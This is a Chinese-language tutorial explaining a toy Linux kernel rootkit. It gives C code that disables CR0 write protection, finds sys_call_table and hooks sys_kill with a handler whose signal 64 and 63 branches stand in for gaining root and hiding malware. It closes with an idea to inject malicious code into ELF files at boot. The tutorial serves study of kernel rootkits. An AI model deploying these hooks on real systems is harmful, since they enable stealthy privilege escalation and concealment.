## Overview：toy1的工作原理
这里简要过一遍流程，以便阅读后续内容和toy1源码时方便理解。

具体来说，toy1采用了hook的方式工作，这里简要介绍这边的hook是什么意思。

toy1通过内核函数kallsyms_lookup_name找到sys_call_table，而sys_call_table是一个存放了很多很多系统调用地址的数组，参考下文：

```C
#undef __NR_syscalls
#define __NR_syscalls 451

/*
 * 32 bit systems traditionally used different
 * syscalls for off_t and loff_t arguments, while
 * 64 bit systems only need the off_t version.
 * For new 32 bit platforms, there is no need to
 * implement the old 32 bit off_t syscalls, so
 * they take different names.
 * Here we map the numbers so that both versions
 * use the same syscall table layout.
 */
```
摘自https://elixir.bootlin.com/linux/latest/source/include/uapi/asm-generic/unistd.h#L890。

特别的，toy1利用了sys_kill函数，其函数地址存放在sys_call_table[__NR_kill]之中。toy1将修改这个函数地址指向别处（比如我们自己定义的hack_kill）函数，在完成了我们自己定义的部分功能后，再正常执行原本sys_kill的功能，这样加装该rootkit后，至少在功能上不会出现太大的问题。

这便是全部的流程，下面对各个细节做简要的解释。

## 修改syscall table内容
x86架构下，syscall_table对应的内存受到了系统的保护。寄存器CR0被设置以保护内存，因此需flip其第16位数据以使得内存不再受到保护。

https://jm33.me/we-can-no-longer-easily-disable-cr0-wp-write-protection.html

具体代码如下，利用inline assembly来解除寄存器cr0对内存的保护。可以参考这个文档：

https://gcc.gnu.org/onlinedocs/gcc/Extended-Asm.html
```
"mov %0, %%cr0": "+r"(val), "+m"(__force_order));
```
该行表示以read+write的方式将val的内容以%0的方式借代，并赋值给cr0寄存器，并将值同时存放到__force_order对应的内存地址之中。注释中已经点名，之所以这么做是防止reorder时编译器的读写优化，因此找一个dummy memory position存放。

val的赋值仅需了解cr0的第十六位在翻转即可，该段代码解析完成。
```C
static inline void write_cr0_forced(unsigned long val) {
    unsigned long __force_order;

    asm volatile(
        "mov %0, %%cr0"
        : "+r"(val), "+m"(__force_order));
    // prevent read from being reordered with respect to writes, use a dummy operand.
}

// the 16th bit of cr0 should be flipped if we want to change the memory info. 
static void unprotect_memory(void) {
    write_cr0_forced(read_cr0() & (~ 0x10000));
    printk(KERN_INFO "protected memory\n");
}

static void protect_memory(void) {
    write_cr0_forced(read_cr0() | (0x10000));
    printk(KERN_INFO "protected memory\n");
}
```
以此，我们能够进行对sys_call_table中的内容进行修改。

## 一些版本限定：
本次对于开发版本做了部分限定。在这里定义了部分宏来帮忙处理此事。
```C
#ifdef CONFIG_X86_64

#if LINUX_VERSION_CODE >= KERNEL_VERSION(4, 17, 0)
#define PTREGS_SYSCALL_STUB 1
typedef asmlinkage long (*ptregs_t)(const struct pt_regs *regs);
static ptregs_t orig_kill;
#else
typedef asmlinkage long (*orig_kill_t)(pid_t pid, int sig);
static orig_kill_t orig_kill;
#endif
#endif
```
假定开发环境为X86_64，且需判断kernel版本和4.17.0之间的大小关系。参考内容：

https://www.kernel.org/doc/html/v4.17/process/adding-syscalls.html

在这则post提到高版本内核在pt_regs中存放了相关的寄存器信息，且内核模块不能直接使用系统调用函数，如果需要调用需要参阅这个资料来检查寄存器的使用情况，特别的，toy1中盗用的是sys_kill函数。

https://syscalls64.paolostivanin.com/

而低版本则可以直接盗取相关参数直接运行函数，因此分情况讨论之。当然，这个我们后续再说。

在不同版本下分别用typedef定义了两个函数，实际上这就是我们替换sys_kill事先准备好的函数指针，可以看到后面的参数和我们先前提到的不同版本是呼应的。

## 找到syscall_table的位置以便调用
```C 
static unsigned long *get_syscall_table(void) {
    unsigned long * syscall_table;
    #if LINUX_VERSION_CODE > KERNEL_VERSION(4, 4, 0)
        syscall_table = (unsigned long *) kallsyms_lookup_name("sys_call_table");
    #else
        syscall_table = NULL;
    #endif

    return syscall_table;
}
```
这一部分代码是在前一版toy1中出现的，利用kallsyms_lookup_name内核函数找到了syscall_table的地址。
## hook操作
简要介绍一下hook函数的功能，其替换了sys_call_table中原本存放sys_kill系统调用位置的地址为我们自定义的函数hack_kill，这样，若接下来系统出现了sys_kill函数的系统调用，系统将会执行hack_kill。

与此同时，利用了store函数存放原本sys_kill函数的地址，以便sys_kill可以正常地执行。
```C
static int hook(void) {
    __sys_call_table[__NR_kill] = (unsigned long) &hack_kill;
    return 0;
}

static int store(void) {
    #if PTREGS_SYSCALL_STUB
        orig_kill = (ptregs_t)__sys_call_table[__NR_kill];
        printk(KERN_INFO "orig_kill table entry successfully stored\n");
    #else
        orig_kill = (orig_kill_t)__sys_call_table[__NR_kill];
        printk(KERN_INFO "orig_kill table entry successfully stored\n");
    #endif

    return 0;
}
```
## hack_kill自定义
此处我们简要解释hack_kill自定义函数。

注意到平常我们需要终止一个进程会采用类似于'kill -9 <pid>'之类的命令，而这个9，恰好是sys_kill中的sig，即信号部分（9代表SIGKILL）。因此hack_kill的工作就很明了了，若信号64或者63存在，捕获可能存在的信号并输出（这是hook帮助我们实现的自定义部分），最后执行原本的正常的sys_kill就可以了。

依照软件安全原理所述：出毛病最好不让你发现功能失效了，因此最后一步调用正常的sys_kill是相当自然的。
```C
enum signals {
    SIGSUPER = 64, // we just take this as an example.
    SIGINVIS = 63,
};

#if PTREGS_SYSCALL_STUB

static asmlinkage long hack_kill(const struct pt_regs *regs) {
    int sig = regs->si;

    if (sig == SIGSUPER) {
        printk(KERN_INFO "signal: %d == SIGSUPER: %d | become root\n", sig, SIGSUPER);
        return 0;
    } else if (sig == SIGINVIS) {
        printk(KERN_INFO "signal: %d == SIGINVIS: %d | hide itself/malware/etc\n", sig, SIGINVIS);
    }

    printk(KERN_INFO "======= hacked kill syscall =========");
    return orig_kill(regs);
}

#else

static asmlinkage long hack_kill(pid_t pid, int sig) {

    if (sig == SIGSUPER) {
        printk(KERN_INFO "signal: %d == SIGSUPER: %d | become root\n", sig, SIGSUPER);
        return 0;
    } else if (sig == SIGINVIS) {
        printk(KERN_INFO "signal: %d == SIGINVIS: %d | hide itself/malware/etc\n", sig, SIGINVIS);
    }
    printk(KERN_INFO "======= hacked kill syscall =========");
    return orig_kill(pid, sig);
}

#endif
```
## 其他思路：
py昨晚和我说了他的思路，他觉得'insmod rmmod'这样有点dinner，因此他打算能够在启动的时候修改进程文件的ELF，以此腾出空间注入自定义恶意代码。

rootkit的hook思路介绍完毕，大家可以利用toy1在适当的环境下玩耍了。我要开始看第二个toy了。